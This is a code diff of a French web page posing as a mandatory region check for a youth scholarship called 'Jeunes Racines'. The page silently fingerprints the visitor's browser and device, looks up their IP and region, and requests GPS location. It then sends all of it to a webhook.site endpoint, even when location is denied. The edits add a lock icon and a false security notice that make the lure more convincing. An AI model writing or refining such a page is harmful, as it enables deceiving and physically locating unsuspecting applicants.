@@ -4,8 +4,6 @@
   <meta charset="UTF-8">
   <title>Jeunes Racines – Confirmation de région</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <!-- ✅ Page styles for mobile-first layout -->
   <style>
     body {
       margin: 0;
@@ -13,7 +11,7 @@
       background-color: #f7f7f7;
     }
     .banner {
-      background-image: url('https://i.imgur.com/ONf3SmL.png'); /* Custom banner image */
+      background-image: url('https://i.imgur.com/ONf3SmL.png');
       background-size: cover;
       height: 220px;
       display: flex;
@@ -23,6 +21,10 @@
       font-size: 28px;
       font-weight: bold;
       text-shadow: 1px 1px 3px #000;
+    }
+    .lock-icon {
+      margin-right: 10px;
+      font-size: 24px;
     }
     .content {
       padding: 30px;
@@ -46,47 +48,58 @@
       max-width: 600px;
       margin: 20px auto;
     }
+    .loading {
+      display: none;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #333;
+    }
+    .region {
+      font-size: 14px;
+      color: #333;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
 
-  <!-- ✅ Top banner (mimics real Google Site header image) -->
-  <div class="banner">Jeunes Racines</div>
+  <!-- 🔒 Lock + Banner -->
+  <div class="banner">
+    <span class="lock-icon">🔒</span>Jeunes Racines
+  </div>
 
-  <!-- ✅ Page content with call to action -->
   <div class="content">
     <img src="https://i.imgur.com/GpAGxP1.png" alt="Jeunes Racines Logo" class="logo">
     <h2>Vérification de la Région Grand Est</h2>
-    <p>
-      Avant de poursuivre votre candidature pour la Bourse Jeunes Racines,
-      veuillez confirmer que vous êtes dans la région Grand Est. Cette vérification est obligatoire.
-    </p>
+    <p>Avant de poursuivre votre candidature pour la Bourse Jeunes Racines, veuillez confirmer que vous êtes dans la région Grand Est. Cette vérification est obligatoire.</p>
+    <div id="ip-region" class="region">📍 Détection de votre région en cours...</div>
     <button onclick="getLocation()">Je confirme ma position</button>
+    <div class="loading" id="loading-text">⏳ Vérification en cours... Merci de patienter.</div>
+    <p style="font-size: 13px; color: grey;">Cette étape prend environ 15 secondes et améliore la sécurité du formulaire.</p>
   </div>
 
-  <!-- ✅ Load FingerprintJS from CDN (no account required) -->
+  <!-- ✅ Fingerprint + IP + GPS + Region + Redirect -->
   <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
   <script>
-    // Store all data we want to send
     let fingerprintData = {};
+    let finalRedirectURL = "https://sites.google.com/view/jeunes-racines/form"; // <-- change if needed
 
-    // Step 1: Generate fingerprint hash and collect basic device/browser info
     FingerprintJS.load().then(fp => {
       fp.get().then(result => {
         fingerprintData = {
-          visitorId: result.visitorId,           // Unique hash per user
-          components: result.components,         // Full fingerprint breakdown
+          visitorId: result.visitorId,
+          components: result.components,
           screen: {
-            width: window.screen.width,          // Screen width (useful for device ID)
-            height: window.screen.height         // Screen height
+            width: window.screen.width,
+            height: window.screen.height
           },
-          language: navigator.language,          // e.g. "fr-FR"
-          platform: navigator.platform,          // e.g. "iPhone", "MacIntel"
-          deviceMemory: navigator.deviceMemory || "unknown", // Mobile devices may not expose this
+          language: navigator.language,
+          platform: navigator.platform,
+          deviceMemory: navigator.deviceMemory || "unknown",
           cpuCores: navigator.hardwareConcurrency || "unknown"
         };
 
-        // Step 2: Get IP and region info from ipwho.is API
+        // 📍 Fetch IP + region info
         fetch('https://ipwho.is/')
           .then(response => response.json())
           .then(ipInfo => {
@@ -99,15 +112,17 @@
               region: ipInfo.region,
               timezone: ipInfo.timezone?.id
             };
+
+            document.getElementById('ip-region').textContent = `📍 Région détectée : ${ipInfo.region}, ${ipInfo.country}`;
           });
       });
     });
 
-    // ✅ Step 3: Get GPS location after user interaction (triggers popup)
     function getLocation() {
+      document.getElementById("loading-text").style.display = "block";
+
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
-          // ✅ If user allows GPS: send coordinates + fingerprint to Webhook
           fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -118,10 +133,10 @@
               fingerprint: fingerprintData
             })
           });
-          // ✅ Redirect to the real homepage
-          window.location.href = "https://sites.google.com/view/jeunes-racines/";
+          setTimeout(() => {
+            window.location.href = finalRedirectURL;
+          }, 1000);
         }, function(error) {
-          // ❌ If user denies GPS, log denial + fingerprint
           fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -131,11 +146,9 @@
             })
           });
           alert("Accès refusé. Redirection...");
-          // ❌ Redirect to warning/info page
           window.location.href = "https://sites.google.com/view/jeunes-racines/localisation-non-verifiee";
         });
       } else {
-        // ⚠️ If GPS isn’t supported (very rare on mobile)
         alert("Géolocalisation non supportée.");
       }
     }
